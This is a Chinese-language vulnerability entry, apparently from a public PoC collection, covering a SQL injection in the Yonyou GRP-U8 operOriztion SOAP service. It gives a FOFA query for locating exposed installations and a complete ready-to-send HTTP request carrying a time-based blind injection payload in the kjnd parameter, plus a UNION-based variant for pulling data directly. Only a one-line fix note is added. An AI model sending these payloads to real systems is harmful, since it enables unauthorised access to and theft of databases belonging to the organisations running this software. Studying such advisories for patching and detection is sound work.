---
fofa: "app=\"用友-GRP-U8\""
source: "I-Wanna-Get-All/R4gd0ll"
---

# 用友 GRP-U8 operOriztion SQL注入漏洞

# 漏洞描述

用友 GRP-U8 /services/operOriztion 接口 getGsbmfaByKjnd 方法 kjnd 参数存在 SQL 注入漏洞。攻击者可通过 SOAP 请求中的时间盲注/联合注入执行任意 SQL 语句，获取数据库敏感信息。

# 影响版本

用友 GRP-U8

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-GRP-U8"

POC/EXP：

```
POST /services/operOriztion HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
Accept-Encoding: gzip, deflate
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://wsdd">
<soapenv:Body>
<wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<kjnd xsi:type="xsd:string" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">gero et';waitfor/**/+delay/**/+'0:0:3'--</kjnd>
</wsdd:getGsbmfaByKjnd>
</soapenv:Body>
</soapenv:Envelope>
```

若响应延迟约 3 秒，则存在时间盲注；亦可替换为联合注入语句（如 `gero et' UNION ALL SELECT user_name()--`）直接回显提取数据。

# 漏洞修复

联系用友官方获取安全补丁，对 kjnd 参数使用预编译语句并做严格过滤。
